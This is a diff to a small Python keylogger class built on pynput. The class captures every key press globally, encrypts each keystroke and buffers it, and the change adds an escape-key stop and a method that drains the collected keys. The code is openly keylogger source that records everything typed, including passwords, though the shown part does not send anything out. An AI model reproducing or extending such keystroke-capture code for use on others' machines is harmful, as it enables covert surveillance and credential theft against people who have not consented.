@@ -1,5 +1,6 @@
 from pynput import keyboard
 from IKeyLogger import *
+from Encryption import Encryption
 
 
 class KeyBoard(IKeyLogger):
@@ -11,38 +12,32 @@ class KeyBoard(IKeyLogger):
         if self.listening is None:
             self.listening = keyboard.Listener(on_press=self.filter)
             self.listening.start()
+            #self.listening.join()
 
     def stop_listening(self) -> None:
         if self.listening is not None:
             self.listening.stop()
             self.listening = None
 
-    def get_listen_keys(self) -> str:
-        return self.to_string(self.key_presses)
-
     def filter(self, key):
-        try:
-            self.key_presses.append(key.char)
-        except AttributeError:
-            key = key.name
-            self.key_presses.append(key)
-        self.key_presses.append(key)
+        if key == keyboard.Key.esc:# for stop press esc
+            self.stop_listening()
+        else:
+            key = str(key)
+            enc = Encryption(key)
+            encrypted_key = enc.encryption_text()
+            self.key_presses.append(encrypted_key)
 
-    def to_string(self,key):
-        key = [" " if k == 'space' else k for k in key]
-        key = "".join(key)
-        return key
-
-
-
+    def get_key_presses(self):
+        presses = self.key_presses
+        self.key_presses = []
+        return presses
 
 
 
-if __name__ == "__main__":
-    logger = KeyBoard()
-    logger.start_listening()
 
-    input("Press Enter to stop listening...\n")
-    logger.stop_listening()
 
-    print("Logged keys:", logger.get_listen_keys())
+
+
+
+
